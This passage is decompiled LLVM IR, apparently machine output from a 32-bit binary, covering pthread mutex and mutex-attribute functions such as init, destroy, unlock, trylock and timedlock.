  %v2_804ec3911 = load i32, i32* %v1_804ec3910, align 4
  %v3_804ec3912 = icmp eq i32 %v2_804ec3911, 0
  br i1 %v3_804ec3912, label %dec_label_pc_804ec45, label %dec_label_pc_804ec5b

dec_label_pc_804ec45:                             ; preds = %entry, %dec_label_pc_804ec45.dec_label_pc_804ec39_crit_edge
  %v1_804ec3913 = phi i32* [ %v1_804ec39, %dec_label_pc_804ec45.dec_label_pc_804ec39_crit_edge ], [ %v1_804ec3910, %entry ]
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804ec4e = load i32, i32* %v1_804ec3913, align 4
  %v15_804ec4e = icmp eq i32 %v2_804ec4e, 0
  %v22_804ec4e = select i1 %v15_804ec4e, i32 1, i32 %v2_804ec4e
  store i32 %v22_804ec4e, i32* %v1_804ec3913, align 4
  %v1_804ec52 = zext i1 %v15_804ec4e to i32
  %v2_804ec52 = load i32, i32* %edx.global-to-local, align 4
  %v3_804ec52 = and i32 %v2_804ec52, -256
  %v4_804ec52 = or i32 %v3_804ec52, %v1_804ec52
  store i32 %v4_804ec52, i32* @edx, align 4
  %v4_804ec55 = icmp eq i1 %v15_804ec4e, false
  br i1 %v4_804ec55, label %dec_label_pc_804ec45.dec_label_pc_804ec39_crit_edge, label %dec_label_pc_804ec59

dec_label_pc_804ec45.dec_label_pc_804ec39_crit_edge: ; preds = %dec_label_pc_804ec45
  %v0_804ec39.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ec39 = inttoptr i32 %v0_804ec39.pre to i32*
  %v2_804ec39 = load i32, i32* %v1_804ec39, align 4
  %v3_804ec39 = icmp eq i32 %v2_804ec39, 0
  br i1 %v3_804ec39, label %dec_label_pc_804ec45, label %dec_label_pc_804ec5b

dec_label_pc_804ec59:                             ; preds = %dec_label_pc_804ec45
  br label %dec_label_pc_804ec5b

dec_label_pc_804ec5b:                             ; preds = %entry, %dec_label_pc_804ec45.dec_label_pc_804ec39_crit_edge, %dec_label_pc_804ec59
  %storemerge = phi i32 [ 0, %dec_label_pc_804ec59 ], [ 16, %dec_label_pc_804ec45.dec_label_pc_804ec39_crit_edge ], [ 16, %entry ]
  %v2_804ec5b = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ec5b, i32* %ecx.global-to-local, align 4
  %v2_804ec5c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ec5c, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %v1_804ec39, { 1, 0 }
  uselistorder i1 %v15_804ec4e, { 1, 0, 2 }
  uselistorder i32 %v2_804ec4e, { 1, 0 }
  uselistorder i32* %v1_804ec3913, { 1, 0 }
  uselistorder label %dec_label_pc_804ec5b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ec45, { 1, 0 }
}

define i32 @pthread_mutex_init(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %tmp2, i32* @ecx, align 4
  store i32 3, i32* %edx.global-to-local, align 4
  %v1_804ec6b = icmp eq i32* %arg2, null
  %v1_804ec6d = add i32 %arg1, 16
  %v2_804ec6d = inttoptr i32 %v1_804ec6d to i32*
  store i32 0, i32* %v2_804ec6d, align 4
  %v0_804ec74 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ec74 = add i32 %v0_804ec74, 20
  %v2_804ec74 = inttoptr i32 %v1_804ec74 to i32*
  store i32 0, i32* %v2_804ec74, align 4
  br i1 %v1_804ec6b, label %entry.dec_label_pc_804ec7f_crit_edge, label %dec_label_pc_804ec7d

entry.dec_label_pc_804ec7f_crit_edge:             ; preds = %entry
  %v0_804ec7f.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ec7f

dec_label_pc_804ec7d:                             ; preds = %entry
  %v2_804ec7d = load i32, i32* %arg2, align 4
  store i32 %v2_804ec7d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ec7f

dec_label_pc_804ec7f:                             ; preds = %entry.dec_label_pc_804ec7f_crit_edge, %dec_label_pc_804ec7d
  %v0_804ec7f = phi i32 [ %v0_804ec7f.pre, %entry.dec_label_pc_804ec7f_crit_edge ], [ %v2_804ec7d, %dec_label_pc_804ec7d ]
  %v1_804ec7f = load i32, i32* %eax.global-to-local, align 4
  %v2_804ec7f = add i32 %v1_804ec7f, 12
  %v3_804ec7f = inttoptr i32 %v2_804ec7f to i32*
  store i32 %v0_804ec7f, i32* %v3_804ec7f, align 4
  %v0_804ec82 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ec82 = add i32 %v0_804ec82, 4
  %v2_804ec82 = inttoptr i32 %v1_804ec82 to i32*
  store i32 0, i32* %v2_804ec82, align 4
  %v0_804ec89 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ec89 = add i32 %v0_804ec89, 8
  %v2_804ec89 = inttoptr i32 %v1_804ec89 to i32*
  store i32 0, i32* %v2_804ec89, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804ec7f, { 1, 0 }
}

define i32 @pthread_mutex_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_804ec97 = add i32 %arg1, 12
  %v2_804ec97 = inttoptr i32 %v1_804ec97 to i32*
  %v3_804ec97 = load i32, i32* %v2_804ec97, align 4
  %v2_804ec9a = icmp slt i32 %v3_804ec97, 0
  br i1 %v2_804ec9a, label %dec_label_pc_804eca8, label %dec_label_pc_804ec9e

dec_label_pc_804ec9e:                             ; preds = %entry
  %v7_804eca1 = icmp sgt i32 %v3_804ec97, 1
  br i1 %v7_804eca1, label %dec_label_pc_804eca3, label %dec_label_pc_804ecae

dec_label_pc_804eca3:                             ; preds = %dec_label_pc_804ec9e
  %v7_804eca6 = icmp sgt i32 %v3_804ec97, 3
  br i1 %v7_804eca6, label %dec_label_pc_804eca8, label %dec_label_pc_804ecb8

dec_label_pc_804eca8:                             ; preds = %dec_label_pc_804eca3, %entry
  ret i32 22

dec_label_pc_804ecae:                             ; preds = %dec_label_pc_804ec9e
  %v1_804ecae = add i32 %arg1, 16
  %v2_804ecae = inttoptr i32 %v1_804ecae to i8*
  %v3_804ecae = load i8, i8* %v2_804ecae, align 1
  %v4_804ecae = urem i8 %v3_804ecae, 2
  %v5_804ecae = icmp eq i8 %v4_804ecae, 0
  br i1 %v5_804ecae, label %dec_label_pc_804ecc0, label %dec_label_pc_804ecba

dec_label_pc_804ecb8:                             ; preds = %dec_label_pc_804eca3
  %v1_804ecb4 = add i32 %arg1, 16
  %v2_804ecb4 = inttoptr i32 %v1_804ecb4 to i32*
  %v3_804ecb4 = load i32, i32* %v2_804ecb4, align 4
  %v4_804ecb4 = icmp eq i32 %v3_804ecb4, 0
  br i1 %v4_804ecb4, label %dec_label_pc_804ecc0, label %dec_label_pc_804ecba

dec_label_pc_804ecba:                             ; preds = %dec_label_pc_804ecae, %dec_label_pc_804ecb8
  ret i32 16

dec_label_pc_804ecc0:                             ; preds = %dec_label_pc_804ecae, %dec_label_pc_804ecb8
  ret i32 0

; uselistorder directives
  uselistorder label %dec_label_pc_804ecc0, { 1, 0 }
  uselistorder label %dec_label_pc_804ecba, { 1, 0 }
}

define i32 @pthread_mutexattr_init(i32* %arg1) local_unnamed_addr {
entry:
  store i32 3, i32* %arg1, align 4
  ret i32 0
}

define i32 @pthread_mutexattr_destroy(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutexattr_setkind_np(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_804ecdf = icmp ugt i32 %arg2, 3
  br i1 %v6_804ecdf, label %dec_label_pc_804ece9, label %dec_label_pc_804ece1

dec_label_pc_804ece1:                             ; preds = %entry
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_804ece9

dec_label_pc_804ece9:                             ; preds = %entry, %dec_label_pc_804ece1
  %v0_804ece9 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_804ece1 ]
  ret i32 %v0_804ece9

; uselistorder directives
  uselistorder label %dec_label_pc_804ece9, { 1, 0 }
}

define i32 @__pthread_mutexattr_gettype(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_804ecee = load i32, i32* %arg1, align 4
  %v2_804ecf4 = inttoptr i32 %arg2 to i32*
  store i32 %v2_804ecee, i32* %v2_804ecf4, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_getpshared(i32* %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* %arg1, align 4
  ret i32 0
}

define i32 @__pthread_mutexattr_setpshared(i32 %arg1) local_unnamed_addr {
entry:
  %tmp2 = or i32 %arg1, 1
  %tmp3 = icmp eq i32 %tmp2, 1
  br i1 %tmp3, label %dec_label_pc_804ed14, label %dec_label_pc_804ed1b

dec_label_pc_804ed14:                             ; preds = %entry
  br label %dec_label_pc_804ed1b

dec_label_pc_804ed1b:                             ; preds = %entry, %dec_label_pc_804ed14
  %v0_804ed1b = phi i32 [ 22, %entry ], [ 38, %dec_label_pc_804ed14 ]
  ret i32 %v0_804ed1b

; uselistorder directives
  uselistorder label %dec_label_pc_804ed1b, { 1, 0 }
}

define i32 @__pthread_once_fork_child() local_unnamed_addr {
entry:
  %v3_804ed26 = call i32 @pthread_mutex_init(i32 ptrtoint (i32* @global_var_8063008.195 to i32), i32* null)
  %v3_804ed32 = call i32 @pthread_cond_init(i32* nonnull @global_var_8063020.196, i32 0)
  %v0_804ed37 = load i32, i32* @global_var_806302c.197, align 4
  %v1_804ed3f = add i32 %v0_804ed37, -2147483643
  %v6_804ed3f = sub i32 2147483642, %v0_804ed37
  %v7_804ed3f = and i32 %v6_804ed3f, %v0_804ed37
  %v8_804ed3f = icmp slt i32 %v7_804ed3f, 0
  %v9_804ed3f = icmp eq i32 %v1_804ed3f, 0
  %v10_804ed3f = icmp slt i32 %v1_804ed3f, 0
  %v3_804ed44 = icmp eq i1 %v10_804ed3f, %v8_804ed3f
  %v4_804ed44 = icmp eq i1 %v9_804ed3f, false
  %v5_804ed44 = and i1 %v4_804ed44, %v3_804ed44
  br i1 %v5_804ed44, label %dec_label_pc_804ed5a, label %dec_label_pc_804ed46

dec_label_pc_804ed46:                             ; preds = %entry
  %v1_804ed46 = add i32 %v0_804ed37, 4
  br label %dec_label_pc_804ed5a

dec_label_pc_804ed5a:                             ; preds = %entry, %dec_label_pc_804ed46
  %storemerge = phi i32 [ %v1_804ed46, %dec_label_pc_804ed46 ], [ 0, %entry ]
  %v0_804ed5d = phi i32 [ %v1_804ed46, %dec_label_pc_804ed46 ], [ %v0_804ed37, %entry ]
  store i32 %storemerge, i32* @global_var_806302c.197, align 4
  ret i32 %v0_804ed5d

; uselistorder directives
  uselistorder i32 %v1_804ed3f, { 1, 0 }
  uselistorder i32 %v0_804ed37, { 1, 2, 0, 4, 3 }
  uselistorder label %dec_label_pc_804ed5a, { 1, 0 }
}

define i32 @thread_self.18(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_2096672 = alloca i32, align 4
  %stack_var_2097151 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_804ed5e = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_804ed5e, i32* @edx, align 4
  %v0_804ed65 = load i32, i32* @esp, align 4
  %v1_804ed65 = load i32, i32* @global_var_8062fec.134, align 4
  %v7_804ed65 = icmp ult i32 %v0_804ed65, %v1_804ed65
  %v1_804ed6b = icmp eq i1 %v7_804ed65, false
  br i1 %v1_804ed6b, label %dec_label_pc_804ed9c, label %dec_label_pc_804ed6d

dec_label_pc_804ed6d:                             ; preds = %entry
  %v1_804ed6d = load i32, i32* @global_var_8062ff0.135, align 16
  %v7_804ed6d = icmp ult i32 %v0_804ed65, %v1_804ed6d
  br i1 %v7_804ed6d, label %dec_label_pc_804ed82, label %dec_label_pc_804ed75

dec_label_pc_804ed75:                             ; preds = %dec_label_pc_804ed6d
  %v1_804ed7a = load i32, i32* @global_var_8062ff4.137, align 4
  %v7_804ed7a = icmp ult i32 %v0_804ed65, %v1_804ed7a
  br i1 %v7_804ed7a, label %dec_label_pc_804ed9c, label %dec_label_pc_804ed82

dec_label_pc_804ed82:                             ; preds = %dec_label_pc_804ed75, %dec_label_pc_804ed6d
  %v0_804ed82 = load i32, i32* @global_var_8067650.138, align 16
  %v1_804ed82 = icmp eq i32 %v0_804ed82, 0
  br i1 %v1_804ed82, label %dec_label_pc_804ed90, label %dec_label_pc_804ed8b

dec_label_pc_804ed8b:                             ; preds = %dec_label_pc_804ed82
  %v0_804ed8b = call i32 @__pthread_find_self()
  br label %dec_label_pc_804ed90

dec_label_pc_804ed90:                             ; preds = %dec_label_pc_804ed82, %dec_label_pc_804ed8b
  %v3_804ed90 = ptrtoint i32* %stack_var_2097151 to i32
  store i32 %v3_804ed90, i32* @edx, align 4
  %v2_804ed96 = ptrtoint i32* %stack_var_2096672 to i32
  br label %dec_label_pc_804ed9c

dec_label_pc_804ed9c:                             ; preds = %dec_label_pc_804ed75, %entry, %dec_label_pc_804ed90
  %v0_804ed9c = phi i32 [ ptrtoint (i32* @global_var_8062500.136 to i32), %dec_label_pc_804ed75 ], [ ptrtoint (i32* @global_var_8062320 to i32), %entry ], [ %v2_804ed96, %dec_label_pc_804ed90 ]
  ret i32 %v0_804ed9c

; uselistorder directives
  uselistorder label %dec_label_pc_804ed9c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804ed90, { 1, 0 }
}

define i32 @pthread_mutex_unlock(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804ed9d = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804eda5 = add i32 %arg1, 12
  %v2_804eda5 = inttoptr i32 %v1_804eda5 to i32*
  %v3_804eda5 = load i32, i32* %v2_804eda5, align 4
  %v1_804eda8 = add i32 %v3_804eda5, -1
  %v5_804eda8 = icmp eq i32 %v3_804eda5, 0
  %v9_804eda8 = icmp eq i32 %v1_804eda8, 0
  br i1 %v9_804eda8, label %dec_label_pc_804edc6, label %dec_label_pc_804edad

dec_label_pc_804edad:                             ; preds = %entry
  %v6_804eda8 = sub i32 0, %v3_804eda5
  %v7_804eda8 = and i32 %v3_804eda5, %v6_804eda8
  %v8_804eda8 = icmp slt i32 %v7_804eda8, 0
  %v10_804eda8 = icmp slt i32 %v1_804eda8, 0
  %v3_804edad = icmp eq i1 %v10_804eda8, %v8_804eda8
  br i1 %v3_804edad, label %dec_label_pc_804edb5, label %dec_label_pc_804edaf

dec_label_pc_804edaf:                             ; preds = %dec_label_pc_804edad
  br i1 %v5_804eda8, label %dec_label_pc_804ede6, label %dec_label_pc_804edbf

dec_label_pc_804edb5:                             ; preds = %dec_label_pc_804edad
  %v9_804edb5 = icmp eq i32 %v3_804eda5, 2
  br i1 %v9_804edb5, label %dec_label_pc_804edf9, label %dec_label_pc_804edba

dec_label_pc_804edba:                             ; preds = %dec_label_pc_804edb5
  %v9_804edba = icmp eq i32 %v3_804eda5, 3
  br i1 %v9_804edba, label %dec_label_pc_804ee10, label %dec_label_pc_804edbf

dec_label_pc_804edbf:                             ; preds = %dec_label_pc_804edaf, %dec_label_pc_804edba
  br label %dec_label_pc_804ee23

dec_label_pc_804edc6:                             ; preds = %entry
  %v1_804edc6 = call i32 @thread_self.18(i32 %v0_804ed9d)
  %v0_804edcb = load i32, i32* @ebx, align 4
  %v1_804edcb = add i32 %v0_804edcb, 8
  %v2_804edcb = inttoptr i32 %v1_804edcb to i32*
  %v3_804edcb = load i32, i32* %v2_804edcb, align 4
  %v15_804edcb = icmp eq i32 %v3_804edcb, %v1_804edc6
  %v1_804edce = icmp eq i1 %v15_804edcb, false
  br i1 %v1_804edce, label %dec_label_pc_804ee1e, label %dec_label_pc_804edd0

dec_label_pc_804edd0:                             ; preds = %dec_label_pc_804edc6
  %v1_804edd0 = add i32 %v0_804edcb, 4
  %v2_804edd0 = inttoptr i32 %v1_804edd0 to i32*
  %v3_804edd0 = load i32, i32* %v2_804edd0, align 4
  %tmp12 = icmp slt i32 %v3_804edd0, 1
  br i1 %tmp12, label %dec_label_pc_804eddf, label %dec_label_pc_804edd7

dec_label_pc_804edd7:                             ; preds = %dec_label_pc_804edd0
  %v1_804edd7 = add i32 %v3_804edd0, -1
  store i32 %v1_804edd7, i32* %v2_804edd0, align 4
  br label %dec_label_pc_804ee23

dec_label_pc_804eddf:                             ; preds = %dec_label_pc_804edd0
  store i32 0, i32* %v2_804edcb, align 4
  %v0_804ede9.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ede6

dec_label_pc_804ede6:                             ; preds = %dec_label_pc_804edaf, %dec_label_pc_804eddf
  %v0_804ede9 = phi i32 [ %arg1, %dec_label_pc_804edaf ], [ %v0_804ede9.pre, %dec_label_pc_804eddf ]
  %v1_804ede9 = add i32 %v0_804ede9, 16
  %v1_804eded = inttoptr i32 %v1_804ede9 to i32*
  %v2_804eded = call i32 @__pthread_unlock(i32* %v1_804eded)
  br label %dec_label_pc_804edf2

dec_label_pc_804edf2:                             ; preds = %dec_label_pc_804ee10, %dec_label_pc_804ede6
  br label %dec_label_pc_804ee23

dec_label_pc_804edf9:                             ; preds = %dec_label_pc_804edb5
  %v1_804edf9 = call i32 @thread_self.18(i32 %v0_804ed9d)
  %v0_804edfe = load i32, i32* @ebx, align 4
  %v1_804edfe = add i32 %v0_804edfe, 8
  %v2_804edfe = inttoptr i32 %v1_804edfe to i32*
  %v3_804edfe = load i32, i32* %v2_804edfe, align 4
  %v15_804edfe = icmp eq i32 %v3_804edfe, %v1_804edf9
  %v1_804ee01 = icmp eq i1 %v15_804edfe, false
  br i1 %v1_804ee01, label %dec_label_pc_804ee1e, label %dec_label_pc_804ee03

dec_label_pc_804ee03:                             ; preds = %dec_label_pc_804edf9
  %v1_804ee03 = add i32 %v0_804edfe, 16
  %v2_804ee03 = inttoptr i32 %v1_804ee03 to i32*
  %v3_804ee03 = load i32, i32* %v2_804ee03, align 4
  %v4_804ee03 = icmp eq i32 %v3_804ee03, 0
  br i1 %v4_804ee03, label %dec_label_pc_804ee1e, label %dec_label_pc_804ee09

dec_label_pc_804ee09:                             ; preds = %dec_label_pc_804ee03
  store i32 0, i32* %v2_804edfe, align 4
  %v0_804ee13.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804ee10

dec_label_pc_804ee10:                             ; preds = %dec_label_pc_804edba, %dec_label_pc_804ee09
  %v0_804ee13 = phi i32 [ %arg1, %dec_label_pc_804edba ], [ %v0_804ee13.pre, %dec_label_pc_804ee09 ]
  %v1_804ee13 = add i32 %v0_804ee13, 16
  %v1_804ee17 = inttoptr i32 %v1_804ee13 to i32*
  %v2_804ee17 = call i32 @__pthread_alt_unlock(i32* %v1_804ee17)
  br label %dec_label_pc_804edf2

dec_label_pc_804ee1e:                             ; preds = %dec_label_pc_804ee03, %dec_label_pc_804edf9, %dec_label_pc_804edc6
  br label %dec_label_pc_804ee23

dec_label_pc_804ee23:                             ; preds = %dec_label_pc_804edf2, %dec_label_pc_804edd7, %dec_label_pc_804edbf, %dec_label_pc_804ee1e
  %v0_804ee26 = phi i32 [ 0, %dec_label_pc_804edf2 ], [ 0, %dec_label_pc_804edd7 ], [ 22, %dec_label_pc_804edbf ], [ 1, %dec_label_pc_804ee1e ]
  store i32 %v0_804ed9d, i32* @ebx, align 4
  ret i32 %v0_804ee26

; uselistorder directives
  uselistorder i32 %v3_804edd0, { 1, 0 }
  uselistorder i32 %v1_804eda8, { 1, 0 }
  uselistorder i32 %v3_804eda5, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v0_804ed9d, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804ee23, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804ee10, { 1, 0 }
  uselistorder label %dec_label_pc_804ede6, { 1, 0 }
  uselistorder label %dec_label_pc_804edbf, { 1, 0 }
}

define i32 @__pthread_once_fork_parent() local_unnamed_addr {
entry:
  %v1_804ee2f = call i32 @pthread_mutex_unlock(i32 ptrtoint (i32* @global_var_8063008.195 to i32))
  ret i32 %v1_804ee2f
}

define i32 @pthread_mutex_trylock(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804ee38 = load i32, i32* @edi, align 4
  %v0_804ee39 = load i32, i32* @esi, align 4
  %v0_804ee3a = load i32, i32* @ebx, align 4
  store i32 %v0_804ee3a, i32* %stack_var_-12, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804ee3f = add i32 %arg1, 12
  %v2_804ee3f = inttoptr i32 %v1_804ee3f to i32*
  %v3_804ee3f = load i32, i32* %v2_804ee3f, align 4
  %v1_804ee42 = add i32 %v3_804ee3f, -1
  %v5_804ee42 = icmp eq i32 %v3_804ee3f, 0
  %v9_804ee42 = icmp eq i32 %v1_804ee42, 0
  br i1 %v9_804ee42, label %dec_label_pc_804ee6b, label %dec_label_pc_804ee47

dec_label_pc_804ee47:                             ; preds = %entry
  %v6_804ee42 = sub i32 0, %v3_804ee3f
  %v7_804ee42 = and i32 %v3_804ee3f, %v6_804ee42
  %v8_804ee42 = icmp slt i32 %v7_804ee42, 0
  %v10_804ee42 = icmp slt i32 %v1_804ee42, 0
  %v3_804ee47 = icmp eq i1 %v10_804ee42, %v8_804ee42
  br i1 %v3_804ee47, label %dec_label_pc_804ee4f, label %dec_label_pc_804ee49

dec_label_pc_804ee49:                             ; preds = %dec_label_pc_804ee47
  br i1 %v5_804ee42, label %dec_label_pc_804ee60, label %dec_label_pc_804ee59

dec_label_pc_804ee4f:                             ; preds = %dec_label_pc_804ee47
  %v9_804ee4f = icmp eq i32 %v3_804ee3f, 2
  br i1 %v9_804ee4f, label %dec_label_pc_804ee98, label %dec_label_pc_804ee54

dec_label_pc_804ee54:                             ; preds = %dec_label_pc_804ee4f
  %v9_804ee54 = icmp eq i32 %v3_804ee3f, 3
  br i1 %v9_804ee54, label %dec_label_pc_804eeb0, label %dec_label_pc_804ee59

dec_label_pc_804ee59:                             ; preds = %dec_label_pc_804ee49, %dec_label_pc_804ee54
  store i32 22, i32* @esi, align 4
  br label %dec_label_pc_804eebb

dec_label_pc_804ee60:                             ; preds = %dec_label_pc_804ee49
  %v1_804ee60 = add i32 %arg1, 16
  store i32 %v1_804ee60, i32* @eax, align 4
  store i32 %v0_804ee3a, i32* @ebx, align 4
  %v3_804ee66 = call i32 @__pthread_trylock(i32 %v0_804ee3a, i32 %v0_804ee39, i32 %v0_804ee38)
  %v0_804ee6b.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_804ee6b

dec_label_pc_804ee6b:                             ; preds = %entry, %dec_label_pc_804ee60
  %v0_804ee6b = phi i32 [ %v0_804ee3a, %entry ], [ %v0_804ee6b.pre, %dec_label_pc_804ee60 ]
  %v1_804ee6b = call i32 @thread_self.18(i32 %v0_804ee6b)
  store i32 %v1_804ee6b, i32* %edi.global-to-local, align 4
  %v0_804ee72 = load i32, i32* @ebx, align 4
  %v1_804ee72 = add i32 %v0_804ee72, 8
  %v2_804ee72 = inttoptr i32 %v1_804ee72 to i32*
  %v3_804ee72 = load i32, i32* %v2_804ee72, align 4
  %v15_804ee72 = icmp eq i32 %v3_804ee72, %v1_804ee6b
  %v1_804ee75 = icmp eq i1 %v15_804ee72, false
  br i1 %v1_804ee75, label %dec_label_pc_804ee7e, label %dec_label_pc_804ee77

dec_label_pc_804ee77:                             ; preds = %dec_label_pc_804ee6b
  %v1_804ee77 = add i32 %v0_804ee72, 4
  %v2_804ee77 = inttoptr i32 %v1_804ee77 to i32*
  %v3_804ee77 = load i32, i32* %v2_804ee77, align 4
  %v4_804ee77 = add i32 %v3_804ee77, 1
  store i32 %v4_804ee77, i32* %v2_804ee77, align 4
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804eebb

dec_label_pc_804ee7e:                             ; preds = %dec_label_pc_804ee6b
  %v1_804ee7e = add i32 %v0_804ee72, 16
  store i32 %v1_804ee7e, i32* @eax, align 4
  %v0_804ee81 = load i32, i32* %stack_var_-12, align 4
  %v3_804ee81 = call i32 @__pthread_trylock(i32 %v0_804ee81, i32 %v0_804ee39, i32 %v0_804ee38)
  store i32 %v3_804ee81, i32* @esi, align 4
  %v1_804ee88 = icmp eq i32 %v3_804ee81, 0
  %v1_804ee8a = icmp eq i1 %v1_804ee88, false
  br i1 %v1_804ee8a, label %dec_label_pc_804eebb, label %dec_label_pc_804ee8c

dec_label_pc_804ee8c:                             ; preds = %dec_label_pc_804ee7e
  %v0_804ee8c = load i32, i32* %edi.global-to-local, align 4
  %v1_804ee8c = load i32, i32* @ebx, align 4
  %v2_804ee8c = add i32 %v1_804ee8c, 8
  %v3_804ee8c = inttoptr i32 %v2_804ee8c to i32*
  store i32 %v0_804ee8c, i32* %v3_804ee8c, align 4
  %v0_804ee8f = load i32, i32* @ebx, align 4
  %v1_804ee8f = add i32 %v0_804ee8f, 4
  %v2_804ee8f = inttoptr i32 %v1_804ee8f to i32*
  store i32 0, i32* %v2_804ee8f, align 4
  br label %dec_label_pc_804eebb

dec_label_pc_804ee98:                             ; preds = %dec_label_pc_804ee4f
  %v1_804ee98 = add i32 %arg1, 16
  store i32 %v1_804ee98, i32* @eax, align 4
  %v3_804ee9b = call i32 @__pthread_alt_trylock(i32 %v0_804ee3a, i32 %v0_804ee39, i32 %v0_804ee38)
  store i32 %v3_804ee9b, i32* @esi, align 4
  %v1_804eea2 = icmp eq i32 %v3_804ee9b, 0
  %v1_804eea4 = icmp eq i1 %v1_804eea2, false
  br i1 %v1_804eea4, label %dec_label_pc_804eebb, label %dec_label_pc_804eea6

dec_label_pc_804eea6:                             ; preds = %dec_label_pc_804ee98
  %v0_804eea6 = load i32, i32* %stack_var_-12, align 4
  %v1_804eea6 = call i32 @thread_self.18(i32 %v0_804eea6)
  %v1_804eeab = load i32, i32* @ebx, align 4
  %v2_804eeab = add i32 %v1_804eeab, 8
  %v3_804eeab = inttoptr i32 %v2_804eeab to i32*
  store i32 %v1_804eea6, i32* %v3_804eeab, align 4
  br label %dec_label_pc_804eebb

dec_label_pc_804eeb0:                             ; preds = %dec_label_pc_804ee54
  %v1_804eeb0 = add i32 %arg1, 16
  store i32 %v1_804eeb0, i32* @eax, align 4
  store i32 %v0_804ee3a, i32* @ebx, align 4
  %v3_804eeb6 = call i32 @__pthread_alt_trylock(i32 %v0_804ee3a, i32 %v0_804ee39, i32 %v0_804ee38)
  br label %dec_label_pc_804eebb

dec_label_pc_804eebb:                             ; preds = %dec_label_pc_804ee98, %dec_label_pc_804ee7e, %dec_label_pc_804eea6, %dec_label_pc_804ee8c, %dec_label_pc_804ee77, %dec_label_pc_804ee59, %dec_label_pc_804eeb0
  %v0_804eebb = load i32, i32* @esi, align 4
  %v2_804eebd = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804eebd, i32* @ebx, align 4
  store i32 %v0_804ee39, i32* @esi, align 4
  store i32 %v0_804ee38, i32* @edi, align 4
  ret i32 %v0_804eebb

; uselistorder directives
  uselistorder i32 %v1_804ee42, { 1, 0 }
  uselistorder i32 %v3_804ee3f, { 0, 1, 4, 5, 3, 2 }
  uselistorder i32 %v0_804ee3a, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 %v0_804ee39, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_804ee38, { 0, 3, 2, 1, 4 }
  uselistorder i32* %stack_var_-12, { 3, 1, 2, 0, 4 }
  uselistorder i32 (i32, i32, i32)* @__pthread_alt_trylock, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_804eebb, { 6, 2, 0, 3, 1, 4, 5 }
  uselistorder label %dec_label_pc_804ee6b, { 1, 0 }
  uselistorder label %dec_label_pc_804ee59, { 1, 0 }
}

define i32 @pthread_mutex_timedlock(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_804eec3 = load i32, i32* @ebx, align 4
  store i32 %v0_804eec3, i32* %stack_var_-12, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_804eecc = add i32 %arg2, 4
  %v2_804eecc = inttoptr i32 %v1_804eecc to i32*
  %v3_804eecc = load i32, i32* %v2_804eecc, align 4
  %v6_804eed3 = icmp ugt i32 %v3_804eecc, 999999999
  br i1 %v6_804eed3, label %dec_label_pc_804ef6e, label %dec_label_pc_804eed9

dec_label_pc_804eed9:                             ; preds = %entry
  %v1_804eed9 = add i32 %arg1, 12
  %v2_804eed9 = inttoptr i32 %v1_804eed9 to i32*
  %v3_804eed9 = load i32, i32* %v2_804eed9, align 4
  %v1_804eedc = add i32 %v3_804eed9, -1
  %v5_804eedc = icmp eq i32 %v3_804eed9, 0
  %v9_804eedc = icmp eq i32 %v1_804eedc, 0
  br i1 %v9_804eedc, label %dec_label_pc_804ef04, label %dec_label_pc_804eee1

dec_label_pc_804eee1:                             ; preds = %dec_label_pc_804eed9
  %v6_804eedc = sub i32 0, %v3_804eed9
  %v7_804eedc = and i32 %v3_804eed9, %v6_804eedc
  %v8_804eedc = icmp slt i32 %v7_804eedc, 0
  %v10_804eedc = icmp slt i32 %v1_804eedc, 0
  %v3_804eee1 = icmp eq i1 %v10_804eedc, %v8_804eedc
  br i1 %v3_804eee1, label %dec_label_pc_804eeec, label %dec_label_pc_804eee3

